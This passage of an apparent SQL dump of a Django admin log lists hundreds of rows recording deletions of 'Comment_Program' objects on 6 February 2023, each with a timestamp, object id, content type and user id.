15:27:47.835881','3314','Comment_Program object (3314)',3,'',24,2),(1670,'2023-02-06 15:27:47.837687','1807','Comment_Program object (1807)',3,'',24,2),(1671,'2023-02-06 15:27:47.838752','13679','Comment_Program object (13679)',3,'',24,2),(1672,'2023-02-06 15:27:47.839733','8857','Comment_Program object (8857)',3,'',24,2),(1673,'2023-02-06 15:27:47.840764','16615','Comment_Program object (16615)',3,'',24,2),(1674,'2023-02-06 15:27:47.841743','16288','Comment_Program object (16288)',3,'',24,2),(1675,'2023-02-06 15:27:47.842786','15140','Comment_Program object (15140)',3,'',24,2),(1676,'2023-02-06 15:27:47.843814','14423','Comment_Program object (14423)',3,'',24,2),(1677,'2023-02-06 15:27:47.844945','1442','Comment_Program object (1442)',3,'',24,2),(1678,'2023-02-06 15:27:47.846678','6261','Comment_Program object (6261)',3,'',24,2),(1679,'2023-02-06 15:27:47.847714','15120','Comment_Program object (15120)',3,'',24,2),(1680,'2023-02-06 15:27:47.848745','5045','Comment_Program object (5045)',3,'',24,2),(1681,'2023-02-06 15:27:47.849882','12886','Comment_Program object (12886)',3,'',24,2),(1682,'2023-02-06 15:27:47.854597','14911','Comment_Program object (14911)',3,'',24,2),(1683,'2023-02-06 15:27:47.855930','6728','Comment_Program object (6728)',3,'',24,2),(1684,'2023-02-06 15:27:47.857062','5591','Comment_Program object (5591)',3,'',24,2),(1685,'2023-02-06 15:27:47.858090','2377','Comment_Program object (2377)',3,'',24,2),(1686,'2023-02-06 15:27:47.859125','10225','Comment_Program object (10225)',3,'',24,2),(1687,'2023-02-06 15:27:47.860999','6157','Comment_Program object (6157)',3,'',24,2),(1688,'2023-02-06 15:27:47.862056','16451','Comment_Program object (16451)',3,'',24,2),(1689,'2023-02-06 15:27:47.863257','274','Comment_Program object (274)',3,'',24,2),(1690,'2023-02-06 15:27:47.864499','9887','Comment_Program object (9887)',3,'',24,2),(1691,'2023-02-06 15:27:47.865510','6129','Comment_Program object (6129)',3,'',24,2),(1692,'2023-02-06 15:27:47.866629','15664','Comment_Program object (15664)',3,'',24,2),(1693,'2023-02-06 15:27:47.867618','8260','Comment_Program object (8260)',3,'',24,2),(1694,'2023-02-06 15:27:47.868652','8135','Comment_Program object (8135)',3,'',24,2),(1695,'2023-02-06 15:27:47.869672','8210','Comment_Program object (8210)',3,'',24,2),(1696,'2023-02-06 15:27:47.871354','11406','Comment_Program object (11406)',3,'',24,2),(1697,'2023-02-06 15:27:47.872356','149','Comment_Program object (149)',3,'',24,2),(1698,'2023-02-06 15:27:47.873442','2357','Comment_Program object (2357)',3,'',24,2),(1699,'2023-02-06 15:27:47.874500','13911','Comment_Program object (13911)',3,'',24,2),(1700,'2023-02-06 15:27:47.878237','3844','Comment_Program object (3844)',3,'',24,2),(1701,'2023-02-06 15:27:47.879350','14356','Comment_Program object (14356)',3,'',24,2),(1702,'2023-02-06 15:27:47.880463','6094','Comment_Program object (6094)',3,'',24,2),(1703,'2023-02-06 15:27:47.881492','1252','Comment_Program object (1252)',3,'',24,2),(1704,'2023-02-06 15:27:47.882567','3629','Comment_Program object (3629)',3,'',24,2),(1705,'2023-02-06 15:27:47.884367','9047','Comment_Program object (9047)',3,'',24,2),(1706,'2023-02-06 15:27:47.885464','10615','Comment_Program object (10615)',3,'',24,2),(1707,'2023-02-06 15:27:47.886523','4674','Comment_Program object (4674)',3,'',24,2),(1708,'2023-02-06 15:27:47.887492','939','Comment_Program object (939)',3,'',24,2),(1709,'2023-02-06 15:27:47.888604','12837','Comment_Program object (12837)',3,'',24,2),(1710,'2023-02-06 15:27:47.889624','13987','Comment_Program object (13987)',3,'',24,2),(1711,'2023-02-06 15:27:47.890514','824','Comment_Program object (824)',3,'',24,2),(1712,'2023-02-06 15:27:47.891483','797','Comment_Program object (797)',3,'',24,2),(1713,'2023-02-06 15:27:56.045381','15003','Comment_Program object (15003)',3,'',24,2),(1714,'2023-02-06 15:27:56.047088','5192','Comment_Program object (5192)',3,'',24,2),(1715,'2023-02-06 15:27:56.048246','11839','Comment_Program object (11839)',3,'',24,2),(1716,'2023-02-06 15:27:56.049319','7658','Comment_Program object (7658)',3,'',24,2),(1717,'2023-02-06 15:27:56.050317','7756','Comment_Program object (7756)',3,'',24,2),(1718,'2023-02-06 15:27:56.051269','6206','Comment_Program object (6206)',3,'',24,2),(1719,'2023-02-06 15:27:56.052425','1496','Comment_Program object (1496)',3,'',24,2),(1720,'2023-02-06 15:27:56.053396','6797','Comment_Program object (6797)',3,'',24,2),(1721,'2023-02-06 15:27:56.054358','16430','Comment_Program object (16430)',3,'',24,2),(1722,'2023-02-06 15:27:56.057153','9145','Comment_Program object (9145)',3,'',24,2),(1723,'2023-02-06 15:27:56.058233','2954','Comment_Program object (2954)',3,'',24,2),(1724,'2023-02-06 15:27:56.059206','6872','Comment_Program object (6872)',3,'',24,2),(1725,'2023-02-06 15:27:56.060166','1902','Comment_Program object (1902)',3,'',24,2),(1726,'2023-02-06 15:27:56.061231','12610','Comment_Program object (12610)',3,'',24,2),(1727,'2023-02-06 15:27:56.062210','2757','Comment_Program object (2757)',3,'',24,2),(1728,'2023-02-06 15:27:56.063168','13426','Comment_Program object (13426)',3,'',24,2),(1729,'2023-02-06 15:27:56.064181','6098','Comment_Program object (6098)',3,'',24,2),(1730,'2023-02-06 15:27:56.065269','11423','Comment_Program object (11423)',3,'',24,2),(1731,'2023-02-06 15:27:56.066976','5626','Comment_Program object (5626)',3,'',24,2),(1732,'2023-02-06 15:27:56.067927','11906','Comment_Program object (11906)',3,'',24,2),(1733,'2023-02-06 15:27:56.068905','9307','Comment_Program object (9307)',3,'',24,2),(1734,'2023-02-06 15:27:56.069870','1635','Comment_Program object (1635)',3,'',24,2),(1735,'2023-02-06 15:27:56.070850','8445','Comment_Program object (8445)',3,'',24,2),(1736,'2023-02-06 15:27:56.071803','1642','Comment_Program object (1642)',3,'',24,2),(1737,'2023-02-06 15:27:56.072840','12912','Comment_Program object (12912)',3,'',24,2),(1738,'2023-02-06 15:27:56.073815','767','Comment_Program object (767)',3,'',24,2),(1739,'2023-02-06 15:27:56.074730','6514','Comment_Program object (6514)',3,'',24,2),(1740,'2023-02-06 15:27:56.076251','10844','Comment_Program object (10844)',3,'',24,2),(1741,'2023-02-06 15:27:56.077296','14142','Comment_Program object (14142)',3,'',24,2),(1742,'2023-02-06 15:27:56.078277','5957','Comment_Program object (5957)',3,'',24,2),(1743,'2023-02-06 15:27:56.079206','2903','Comment_Program object (2903)',3,'',24,2),(1744,'2023-02-06 15:27:56.080224','10349','Comment_Program object (10349)',3,'',24,2),(1745,'2023-02-06 15:27:56.081257','15182','Comment_Program object (15182)',3,'',24,2),(1746,'2023-02-06 15:27:56.082224','2791','Comment_Program object (2791)',3,'',24,2),(1747,'2023-02-06 15:27:56.083134','1218','Comment_Program object (1218)',3,'',24,2),(1748,'2023-02-06 15:27:56.084054','2178','Comment_Program object (2178)',3,'',24,2),(1749,'2023-02-06 15:27:56.085625','4551','Comment_Program object (4551)',3,'',24,2),(1750,'2023-02-06 15:27:56.086584','8094','Comment_Program object (8094)',3,'',24,2),(1751,'2023-02-06 15:27:56.087503','5967','Comment_Program object (5967)',3,'',24,2),(1752,'2023-02-06 15:27:56.088599','3932','Comment_Program object (3932)',3,'',24,2),(1753,'2023-02-06 15:27:56.089600','16131','Comment_Program object (16131)',3,'',24,2),(1754,'2023-02-06 15:27:56.090628','11607','Comment_Program object (11607)',3,'',24,2),(1755,'2023-02-06 15:27:56.091610','2034','Comment_Program object (2034)',3,'',24,2),(1756,'2023-02-06 15:27:56.092693','14854','Comment_Program object (14854)',3,'',24,2),(1757,'2023-02-06 15:27:56.093911','7384','Comment_Program object (7384)',3,'',24,2),(1758,'2023-02-06 15:27:56.095565','7996','Comment_Program object (7996)',3,'',24,2),(1759,'2023-02-06 15:27:56.096599','1486','Comment_Program object (1486)',3,'',24,2),(1760,'2023-02-06 15:27:56.097582','12384','Comment_Program object (12384)',3,'',24,2),(1761,'2023-02-06 15:27:56.098569','9834','Comment_Program object (9834)',3,'',24,2),(1762,'2023-02-06 15:27:56.099494','6658','Comment_Program object (6658)',3,'',24,2),(1763,'2023-02-06 15:27:56.100515','3707','Comment_Program object (3707)',3,'',24,2),(1764,'2023-02-06 15:27:56.101500','5871','Comment_Program object (5871)',3,'',24,2),(1765,'2023-02-06 15:27:56.102430','13706','Comment_Program object (13706)',3,'',24,2),(1766,'2023-02-06 15:27:56.103840','9302','Comment_Program object (9302)',3,'',24,2),(1767,'2023-02-06 15:27:56.105595','1854','Comment_Program object (1854)',3,'',24,2),(1768,'2023-02-06 15:27:56.106734','6880','Comment_Program object (6880)',3,'',24,2),(1769,'2023-02-06 15:27:56.107658','638','Comment_Program object (638)',3,'',24,2),(1770,'2023-02-06 15:27:56.108740','14994','Comment_Program object (14994)',3,'',24,2),(1771,'2023-02-06 15:27:56.111958','2044','Comment_Program object (2044)',3,'',24,2),(1772,'2023-02-06 15:27:56.113034','2672','Comment_Program object (2672)',3,'',24,2),(1773,'2023-02-06 15:27:56.113989','11097','Comment_Program object (11097)',3,'',24,2),(1774,'2023-02-06 15:27:56.114972','2615','Comment_Program object (2615)',3,'',24,2),(1775,'2023-02-06 15:27:56.115992','14783','Comment_Program object (14783)',3,'',24,2),(1776,'2023-02-06 15:27:56.117793','12695','Comment_Program object (12695)',3,'',24,2),(1777,'2023-02-06 15:27:56.118937','11509','Comment_Program object (11509)',3,'',24,2),(1778,'2023-02-06 15:27:56.119910','15711','Comment_Program object (15711)',3,'',24,2),(1779,'2023-02-06 15:27:56.120919','4647','Comment_Program object (4647)',3,'',24,2),(1780,'2023-02-06 15:27:56.121903','751','Comment_Program object (751)',3,'',24,2),(1781,'2023-02-06 15:27:56.122935','12990','Comment_Program object (12990)',3,'',24,2),(1782,'2023-02-06 15:27:56.123955','5418','Comment_Program object (5418)',3,'',24,2),(1783,'2023-02-06 15:27:56.125107','3131','Comment_Program object (3131)',3,'',24,2),(1784,'2023-02-06 15:27:56.126071','1024','Comment_Program object (1024)',3,'',24,2),(1785,'2023-02-06 15:27:56.127738','14448','Comment_Program object (14448)',3,'',24,2),(1786,'2023-02-06 15:27:56.128864','8406','Comment_Program object (8406)',3,'',24,2),(1787,'2023-02-06 15:27:56.129813','3894','Comment_Program object (3894)',3,'',24,2),(1788,'2023-02-06 15:27:56.130755','11373','Comment_Program object (11373)',3,'',24,2),(1789,'2023-02-06 15:27:56.131682','1896','Comment_Program object (1896)',3,'',24,2),(1790,'2023-02-06 15:27:56.132687','14831','Comment_Program object (14831)',3,'',24,2),(1791,'2023-02-06 15:27:56.133668','11707','Comment_Program object (11707)',3,'',24,2),(1792,'2023-02-06 15:27:56.134600','2665','Comment_Program object (2665)',3,'',24,2),(1793,'2023-02-06 15:27:56.135569','11937','Comment_Program object (11937)',3,'',24,2),(1794,'2023-02-06 15:27:56.137174','9379','Comment_Program object (9379)',3,'',24,2),(1795,'2023-02-06 15:27:56.138332','10348','Comment_Program object (10348)',3,'',24,2),(1796,'2023-02-06 15:27:56.139358','10414','Comment_Program object (10414)',3,'',24,2),(1797,'2023-02-06 15:27:56.140390','7377','Comment_Program object (7377)',3,'',24,2),(1798,'2023-02-06 15:27:56.141433','9542','Comment_Program object (9542)',3,'',24,2),(1799,'2023-02-06 15:27:56.142395','3566','Comment_Program object (3566)',3,'',24,2),(1800,'2023-02-06 15:27:56.143400','600','Comment_Program object (600)',3,'',24,2),(1801,'2023-02-06 15:27:56.144399','12257','Comment_Program object (12257)',3,'',24,2),(1802,'2023-02-06 15:27:56.145468','12144','Comment_Program object (12144)',3,'',24,2),(1803,'2023-02-06 15:27:56.147146','265','Comment_Program object (265)',3,'',24,2),(1804,'2023-02-06 15:27:56.148151','5958','Comment_Program object (5958)',3,'',24,2),(1805,'2023-02-06 15:27:56.149242','1320','Comment_Program object (1320)',3,'',24,2),(1806,'2023-02-06 15:27:56.150184','16039','Comment_Program object (16039)',3,'',24,2),(1807,'2023-02-06 15:27:56.151144','5953','Comment_Program object (5953)',3,'',24,2),(1808,'2023-02-06 15:27:56.152143','14280','Comment_Program object (14280)',3,'',24,2),(1809,'2023-02-06 15:27:56.153181','4084','Comment_Program object (4084)',3,'',24,2),(1810,'2023-02-06 15:27:56.154184','16231','Comment_Program object (16231)',3,'',24,2),(1811,'2023-02-06 15:27:56.155752','3364','Comment_Program object (3364)',3,'',24,2),(1812,'2023-02-06 15:27:56.156909','10546','Comment_Program object (10546)',3,'',24,2),(1813,'2023-02-06 15:28:04.102804','15786','Comment_Program object (15786)',3,'',24,2),(1814,'2023-02-06 15:28:04.105513','834','Comment_Program object (834)',3,'',24,2),(1815,'2023-02-06 15:28:04.106856','11603','Comment_Program object (11603)',3,'',24,2),(1816,'2023-02-06 15:28:04.107968','2184','Comment_Program object (2184)',3,'',24,2),(1817,'2023-02-06 15:28:04.109087','842','Comment_Program object (842)',3,'',24,2),(1818,'2023-02-06 15:28:04.110141','392','Comment_Program object (392)',3,'',24,2),(1819,'2023-02-06 15:28:04.111764','10355','Comment_Program object (10355)',3,'',24,2),(1820,'2023-02-06 15:28:04.112816','5198','Comment_Program object (5198)',3,'',24,2),(1821,'2023-02-06 15:28:04.113805','15910','Comment_Program object (15910)',3,'',24,2),(1822,'2023-02-06 15:28:04.114775','11228','Comment_Program object (11228)',3,'',24,2),(1823,'2023-02-06 15:28:04.115780','3664','Comment_Program object (3664)',3,'',24,2),(1824,'2023-02-06 15:28:04.116780','8490','Comment_Program object (8490)',3,'',24,2),(1825,'2023-02-06 15:28:04.117844','1767','Comment_Program object (1767)',3,'',24,2),(1826,'2023-02-06 15:28:04.118785','5461','Comment_Program object (5461)',3,'',24,2),(1827,'2023-02-06 15:28:04.119744','1011','Comment_Program object (1011)',3,'',24,2),(1828,'2023-02-06 15:28:04.121552','118','Comment_Program object (118)',3,'',24,2),(1829,'2023-02-06 15:28:04.122546','2063','Comment_Program object (2063)',3,'',24,2),(1830,'2023-02-06 15:28:04.123559','3866','Comment_Program object (3866)',3,'',24,2),(1831,'2023-02-06 15:28:04.124611','15861','Comment_Program object (15861)',3,'',24,2),(1832,'2023-02-06 15:28:04.125761','13673','Comment_Program object (13673)',3,'',24,2),(1833,'2023-02-06 15:28:04.126722','9209','Comment_Program object (9209)',3,'',24,2),(1834,'2023-02-06 15:28:04.127640','5332','Comment_Program object (5332)',3,'',24,2),(1835,'2023-02-06 15:28:04.128609','11828','Comment_Program object (11828)',3,'',24,2),(1836,'2023-02-06 15:28:04.129654','1802','Comment_Program object (1802)',3,'',24,2),(1837,'2023-02-06 15:28:04.131252','3019','Comment_Program object (3019)',3,'',24,2),(1838,'2023-02-06 15:28:04.132356','4030','Comment_Program object (4030)',3,'',24,2),(1839,'2023-02-06 15:28:04.133375','15246','Comment_Program object (15246)',3,'',24,2),(1840,'2023-02-06 15:28:04.134473','9122','Comment_Program object (9122)',3,'',24,2),(1841,'2023-02-06 15:28:04.135498','8632','Comment_Program object (8632)',3,'',24,2),(1842,'2023-02-06 15:28:04.136532','4779','Comment_Program object (4779)',3,'',24,2),(1843,'2023-02-06 15:28:04.137565','10938','Comment_Program object (10938)',3,'',24,2),(1844,'2023-02-06 15:28:04.138989','642','Comment_Program object (642)',3,'',24,2),(1845,'2023-02-06 15:28:04.140261','315','Comment_Program object (315)',3,'',24,2),(1846,'2023-02-06 15:28:04.141994','15620','Comment_Program object (15620)',3,'',24,2),(1847,'2023-02-06 15:28:04.143159','7309','Comment_Program object (7309)',3,'',24,2),(1848,'2023-02-06 15:28:04.144395','3040','Comment_Program object (3040)',3,'',24,2),(1849,'2023-02-06 15:28:04.145706','9409','Comment_Program object (9409)',3,'',24,2),(1850,'2023-02-06 15:28:04.146869','5391','Comment_Program object (5391)',3,'',24,2),(1851,'2023-02-06 15:28:04.148080','2752','Comment_Program object (2752)',3,'',24,2),(1852,'2023-02-06 15:28:04.149366','10961','Comment_Program object (10961)',3,'',24,2),(1853,'2023-02-06 15:28:04.150717','5308','Comment_Program object (5308)',3,'',24,2),(1854,'2023-02-06 15:28:04.151931','13494','Comment_Program object (13494)',3,'',24,2),(1855,'2023-02-06 15:28:04.153783','3700','Comment_Program object (3700)',3,'',24,2),(1856,'2023-02-06 15:28:04.154993','6955','Comment_Program object (6955)',3,'',24,2),(1857,'2023-02-06 15:28:04.156152','2712','Comment_Program object (2712)',3,'',24,2),(1858,'2023-02-06 15:28:04.157519','2558','Comment_Program object (2558)',3,'',24,2),(1859,'2023-02-06 15:28:04.158823','8088','Comment_Program object (8088)',3,'',24,2),(1860,'2023-02-06 15:28:04.160076','4758','Comment_Program object (4758)',3,'',24,2),(1861,'2023-02-06 15:28:04.161423','4643','Comment_Program object (4643)',3,'',24,2),(1862,'2023-02-06 15:28:04.162639','2631','Comment_Program object (2631)',3,'',24,2),(1863,'2023-02-06 15:28:04.163895','676','Comment_Program object (676)',3,'',24,2),(1864,'2023-02-06 15:28:04.165623','9650','Comment_Program object (9650)',3,'',24,2),(1865,'2023-02-06 15:28:04.166770','3191','Comment_Program object (3191)',3,'',24,2),(1866,'2023-02-06 15:28:04.167977','6020','Comment_Program object (6020)',3,'',24,2),(1867,'2023-02-06 15:28:04.169231','3729','Comment_Program object (3729)',3,'',24,2),(1868,'2023-02-06 15:28:04.170495','10971','Comment_Program object (10971)',3,'',24,2),(1869,'2023-02-06 15:28:04.171852','11418','Comment_Program object (11418)',3,'',24,2),(1870,'2023-02-06 15:28:04.173199','6396','Comment_Program object (6396)',3,'',24,2),(1871,'2023-02-06 15:28:04.174504','4538','Comment_Program object (4538)',3,'',24,2),(1872,'2023-02-06 15:28:04.175740','10864','Comment_Program object (10864)',3,'',24,2),(1873,'2023-02-06 15:28:04.179337','12833','Comment_Program object (12833)',3,'',24,2),(1874,'2023-02-06 15:28:04.180907','9844','Comment_Program object (9844)',3,'',24,2),(1875,'2023-02-06 15:28:04.182213','12547','Comment_Program object (12547)',3,'',24,2),(1876,'2023-02-06 15:28:04.183445','3963','Comment_Program object (3963)',3,'',24,2),(1877,'2023-02-06 15:28:04.184757','16342','Comment_Program object (16342)',3,'',24,2),(1878,'2023-02-06 15:28:04.186055','11487','Comment_Program object (11487)',3,'',24,2),(1879,'2023-02-06 15:28:04.187186','2566','Comment_Program object (2566)',3,'',24,2),(1880,'2023-02-06 15:28:04.188435','2363','Comment_Program object (2363)',3,'',24,2),(1881,'2023-02-06 15:28:04.189655','1474','Comment_Program object (1474)',3,'',24,2),(1882,'2023-02-06 15:28:04.191495','6202','Comment_Program object (6202)',3,'',24,2),(1883,'2023-02-06 15:28:04.192870','9445','Comment_Program object (9445)',3,'',24,2),(1884,'2023-02-06 15:28:04.194241','2640','Comment_Program object (2640)',3,'',24,2),(1885,'2023-02-06 15:28:04.195673','9599','Comment_Program object (9599)',3,'',24,2),(1886,'2023-02-06 15:28:04.197077','14534','Comment_Program object (14534)',3,'',24,2),(1887,'2023-02-06 15:28:04.198251','9153','Comment_Program object (9153)',3,'',24,2),(1888,'2023-02-06 15:28:04.199488','6817','Comment_Program object (6817)',3,'',24,2),(1889,'2023-02-06 15:28:04.200804','15102','Comment_Program object (15102)',3,'',24,2),(1890,'2023-02-06 15:28:04.202076','9593','Comment_Program object (9593)',3,'',24,2),(1891,'2023-02-06 15:28:04.203917','7305','Comment_Program object (7305)',3,'',24,2),(1892,'2023-02-06 15:28:04.205309','16069','Comment_Program object (16069)',3,'',24,2),(1893,'2023-02-06 15:28:04.206450','13630','Comment_Program object (13630)',3,'',24,2),(1894,'2023-02-06 15:28:04.207621','15297','Comment_Program object (15297)',3,'',24,2),(1895,'2023-02-06 15:28:04.210942','418','Comment_Program object (418)',3,'',24,2),(1896,'2023-02-06 15:28:04.212260','14734','Comment_Program object (14734)',3,'',24,2),(1897,'2023-02-06 15:28:04.213412','11202','Comment_Program object (11202)',3,'',24,2),(1898,'2023-02-06 15:28:04.214527','15767','Comment_Program object (15767)',3,'',24,2),(1899,'2023-02-06 15:28:04.215538','6623','Comment_Program object (6623)',3,'',24,2),(1900,'2023-02-06 15:28:04.217221','15579','Comment_Program object (15579)',3,'',24,2),(1901,'2023-02-06 15:28:04.226930','13966','Comment_Program object (13966)',3,'',24,2),(1902,'2023-02-06 15:28:04.228288','413','Comment_Program object (413)',3,'',24,2),(1903,'2023-02-06 15:28:04.229658','4119','Comment_Program object (4119)',3,'',24,2),(1904,'2023-02-06 15:28:04.231127','10809','Comment_Program object (10809)',3,'',24,2),(1905,'2023-02-06 15:28:04.232595','8223','Comment_Program object (8223)',3,'',24,2),(1906,'2023-02-06 15:28:04.233902','16283','Comment_Program object (16283)',3,'',24,2),(1907,'2023-02-06 15:28:04.235288','5457','Comment_Program object (5457)',3,'',24,2),(1908,'2023-02-06 15:28:04.236688','10625','Comment_Program object (10625)',3,'',24,2),(1909,'2023-02-06 15:28:04.238514','16455','Comment_Program object (16455)',3,'',24,2),(1910,'2023-02-06 15:28:04.239785','5329','Comment_Program object (5329)',3,'',24,2),(1911,'2023-02-06 15:28:04.241079','10679','Comment_Program object (10679)',3,'',24,2),(1912,'2023-02-06 15:28:04.242335','9965','Comment_Program object (9965)',3,'',24,2),(1913,'2023-02-06 15:28:15.090736','12286','Comment_Program object (12286)',3,'',24,2),(1914,'2023-02-06 15:28:15.092978','10771','Comment_Program object (10771)',3,'',24,2),(1915,'2023-02-06 15:28:15.094684','4424','Comment_Program object (4424)',3,'',24,2),(1916,'2023-02-06 15:28:15.096118','7446','Comment_Program object (7446)',3,'',24,2),(1917,'2023-02-06 15:28:15.099212','9511','Comment_Program object (9511)',3,'',24,2),(1918,'2023-02-06 15:28:15.100635','15082','Comment_Program object (15082)',3,'',24,2),(1919,'2023-02-06 15:28:15.101943','178','Comment_Program object (178)',3,'',24,2),(1920,'2023-02-06 15:28:15.103177','12324','Comment_Program object (12324)',3,'',24,2),(1921,'2023-02-06 15:28:15.104498','8083','Comment_Program object (8083)',3,'',24,2),(1922,'2023-02-06 15:28:15.105859','10479','Comment_Program object (10479)',3,'',24,2),(1923,'2023-02-06 15:28:15.107101','4998','Comment_Program object (4998)',3,'',24,2),(1924,'2023-02-06 15:28:15.108383','1708','Comment_Program object (1708)',3,'',24,2),(1925,'2023-02-06 15:28:15.110263','13558','Comment_Program object (13558)',3,'',24,2),(1926,'2023-02-06 15:28:15.111577','7387','Comment_Program object (7387)',3,'',24,2),(1927,'2023-02-06 15:28:15.113053','12882','Comment_Program object (12882)',3,'',24,2),(1928,'2023-02-06 15:28:15.114269','6847','Comment_Program object (6847)',3,'',24,2),(1929,'2023-02-06 15:28:15.115507','7976','Comment_Program object (7976)',3,'',24,2),(1930,'2023-02-06 15:28:15.116898','2139','Comment_Program object (2139)',3,'',24,2),(1931,'2023-02-06 15:28:15.118229','1105','Comment_Program object (1105)',3,'',24,2),(1932,'2023-02-06 15:28:15.119577','9338','Comment_Program object (9338)',3,'',24,2),(1933,'2023-02-06 15:28:15.120886','6619','Comment_Program object (6619)',3,'',24,2),(1934,'2023-02-06 15:28:15.122646','14305','Comment_Program object (14305)',3,'',24,2),(1935,'2023-02-06 15:28:15.123827','1977','Comment_Program object (1977)',3,'',24,2),(1936,'2023-02-06 15:28:15.125269','3637','Comment_Program object (3637)',3,'',24,2),(1937,'2023-02-06 15:28:15.126480','10668','Comment_Program object (10668)',3,'',24,2),(1938,'2023-02-06 15:28:15.127672','15898','Comment_Program object (15898)',3,'',24,2),(1939,'2023-02-06 15:28:15.129009','8005','Comment_Program object (8005)',3,'',24,2),(1940,'2023-02-06 15:28:15.130500','15958','Comment_Program object (15958)',3,'',24,2),(1941,'2023-02-06 15:28:15.131787','516','Comment_Program object (516)',3,'',24,2),(1942,'2023-02-06 15:28:15.133221','12917','Comment_Program object (12917)',3,'',24,2),(1943,'2023-02-06 15:28:15.135194','5522','Comment_Program object (5522)',3,'',24,2),(1944,'2023-02-06 15:28:15.136470','8362','Comment_Program object (8362)',3,'',24,2),(1945,'2023-02-06 15:28:15.137657','14573','Comment_Program object (14573)',3,'',24,2),(1946,'2023-02-06 15:28:15.138718','11613','Comment_Program object (11613)',3,'',24,2),(1947,'2023-02-06 15:28:15.140049','11543','Comment_Program object (11543)',3,'',24,2),(1948,'2023-02-06 15:28:15.141542','14726','Comment_Program object (14726)',3,'',24,2),(1949,'2023-02-06 15:28:15.142907','12572','Comment_Program object (12572)',3,'',24,2),(1950,'2023-02-06 15:28:15.144149','14894','Comment_Program object (14894)',3,'',24,2),(1951,'2023-02-06 15:28:15.145439','9184','Comment_Program object (9184)',3,'',24,2),(1952,'2023-02-06 15:28:15.147270','9099','Comment_Program object (9099)',3,'',24,2),(1953,'2023-02-06 15:28:15.148660','8684','Comment_Program object (8684)',3,'',24,2),(1954,'2023-02-06 15:28:15.150020','8758','Comment_Program object (8758)',3,'',24,2),(1955,'2023-02-06 15:28:15.151338','10303','Comment_Program object (10303)',3,'',24,2),(1956,'2023-02-06 15:28:15.152634','10947','Comment_Program object (10947)',3,'',24,2),(1957,'2023-02-06 15:28:15.154634','4840','Comment_Program object (4840)',3,'',24,2),(1958,'2023-02-06 15:28:15.155967','3531','Comment_Program object (3531)',3,'',24,2),(1959,'2023-02-06 15:28:15.157290','8050','Comment_Program object (8050)',3,'',24,2),(1960,'2023-02-06 15:28:15.158396','8826','Comment_Program object (8826)',3,'',24,2),(1961,'2023-02-06 15:28:15.160146','2664','Comment_Program object (2664)',3,'',24,2),(1962,'2023-02-06 15:28:15.161493','11167','Comment_Program object (11167)',3,'',24,2),(1963,'2023-02-06 15:28:15.162847','2048','Comment_Program object (2048)',3,'',24,2),(1964,'2023-02-06 15:28:15.164103','13566','Comment_Program object (13566)',3,'',24,2),(1965,'2023-02-06 15:28:15.165418','1278','Comment_Program object (1278)',3,'',24,2),(1966,'2023-02-06 15:28:15.166583','7925','Comment_Program object (7925)',3,'',24,2),(1967,'2023-02-06 15:28:15.167614','9011','Comment_Program object (9011)',3,'',24,2),(1968,'2023-02-06 15:28:15.168763','13421','Comment_Program object (13421)',3,'',24,2),(1969,'2023-02-06 15:28:15.169821','8299','Comment_Program object (8299)',3,'',24,2),(1970,'2023-02-06 15:28:15.171601','4183','Comment_Program object (4183)',3,'',24,2),(1971,'2023-02-06 15:28:15.173160','6015','Comment_Program object (6015)',3,'',24,2),(1972,'2023-02-06 15:28:15.174371','11389','Comment_Program object (11389)',3,'',24,2),(1973,'2023-02-06 15:28:15.175546','7723','Comment_Program object (7723)',3,'',24,2),(1974,'2023-02-06 15:28:15.176820','5926','Comment_Program object (5926)',3,'',24,2),(1975,'2023-02-06 15:28:15.178291','7717','Comment_Program object (7717)',3,'',24,2),(1976,'2023-02-06 15:28:15.179469','1092','Comment_Program object (1092)',3,'',24,2),(1977,'2023-02-06 15:28:15.180872','12870','Comment_Program object (12870)',3,'',24,2),(1978,'2023-02-06 15:28:15.182170','8252','Comment_Program object (8252)',3,'',24,2),(1979,'2023-02-06 15:28:15.183854','3348','Comment_Program object (3348)',3,'',24,2),(1980,'2023-02-06 15:28:15.185064','4702','Comment_Program object (4702)',3,'',24,2),(1981,'2023-02-06 15:28:15.186352','14671','Comment_Program object (14671)',3,'',24,2),(1982,'2023-02-06 15:28:15.187672','7666','Comment_Program object (7666)',3,'',24,2),(1983,'2023-02-06 15:28:15.188901','6227','Comment_Program object (6227)',3,'',24,2),(1984,'2023-02-06 15:28:15.190022','826','Comment_Program object (826)',3,'',24,2),(1985,'2023-02-06 15:28:15.191301','5290','Comment_Program object (5290)',3,'',24,2),(1986,'2023-02-06 15:28:15.192658','7261','Comment_Program object (7261)',3,'',24,2),(1987,'2023-02-06 15:28:15.193891','3926','Comment_Program object (3926)',3,'',24,2),(1988,'2023-02-06 15:28:15.195862','1103','Comment_Program object (1103)',3,'',24,2),(1989,'2023-02-06 15:28:15.201704','15885','Comment_Program object (15885)',3,'',24,2),(1990,'2023-02-06 15:28:15.203464','5836','Comment_Program object (5836)',3,'',24,2),(1991,'2023-02-06 15:28:15.204965','1245','Comment_Program object (1245)',3,'',24,2),(1992,'2023-02-06 15:28:15.206415','9193','Comment_Program object (9193)',3,'',24,2),(1993,'2023-02-06 15:28:15.207774','12390','Comment_Program object (12390)',3,'',24,2),(1994,'2023-02-06 15:28:15.209136','790','Comment_Program object (790)',3,'',24,2),(1995,'2023-02-06 15:28:15.210655','7983','Comment_Program object (7983)',3,'',24,2),(1996,'2023-02-06 15:28:15.211973','889','Comment_Program object (889)',3,'',24,2),(1997,'2023-02-06 15:28:15.213682','1910','Comment_Program object (1910)',3,'',24,2),(1998,'2023-02-06 15:28:15.214993','6979','Comment_Program object (6979)',3,'',24,2),(1999,'2023-02-06 15:28:15.216248','682','Comment_Program object (682)',3,'',24,2),(2000,'2023-02-06 15:28:15.217548','11396','Comment_Program object (11396)',3,'',24,2),(2001,'2023-02-06 15:28:15.218978','6808','Comment_Program object (6808)',3,'',24,2),(2002,'2023-02-06 15:28:15.220289','4896','Comment_Program object (4896)',3,'',24,2),(2003,'2023-02-06 15:28:15.221706','4125','Comment_Program object (4125)',3,'',24,2),(2004,'2023-02-06 15:28:15.222926','7916','Comment_Program object (7916)',3,'',24,2),(2005,'2023-02-06 15:28:15.224053','1777','Comment_Program object (1777)',3,'',24,2),(2006,'2023-02-06 15:28:15.225887','9474','Comment_Program object (9474)',3,'',24,2),(2007,'2023-02-06 15:28:15.227136','16338','Comment_Program object (16338)',3,'',24,2),(2008,'2023-02-06 15:28:15.228473','11555','Comment_Program object (11555)',3,'',24,2),(2009,'2023-02-06 15:28:15.229679','4958','Comment_Program object (4958)',3,'',24,2),(2010,'2023-02-06 15:28:15.230901','2554','Comment_Program object (2554)',3,'',24,2),(2011,'2023-02-06 